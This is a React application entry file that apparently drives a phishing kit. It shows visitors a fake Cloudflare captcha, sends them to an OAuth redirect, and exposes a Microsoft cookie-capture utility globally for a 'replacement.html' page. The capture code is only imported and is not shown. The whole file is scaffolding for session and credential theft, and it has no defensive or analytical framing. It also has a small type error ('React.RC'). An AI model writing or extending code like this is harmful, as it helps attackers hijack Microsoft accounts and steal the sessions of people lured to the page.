import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AuthCallback from './components/AuthCallback';
import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';

const App: React.FC = () => {
    return (
        <Router>
            <MainContent />
        </Router>
    );
};

const MainContent: React.RC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');
    const location = useLocation();

    useEffect(() => {
        try {
            console.log('✅ Microsoft cookie capture utilities initialized');
            
            // Make functions globally available for replacement.html
            if (typeof window !== 'undefined') {
                (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
            }
        } catch (error) {
            console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
        }
    }, [location]);

    return (
        <Routes>
            <Route path="/auth/callback" element={<AuthCallback />} />
            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
        </Routes>
    );
};

const DefaultPage = ({ currentPage, setCurrentPage }) => {
    useEffect(() => {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        if (step) {
            setCurrentPage(step);
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, [setCurrentPage]);

    const handleCaptchaVerified = () => {
        setCurrentPage('replacement');
    };

    const handleCaptchaBack = () => {
        window.location.reload();
    };
    
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
        case 'replacement':
            return <RealOAuthRedirect />;
        default:
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
    }
};

export default App;
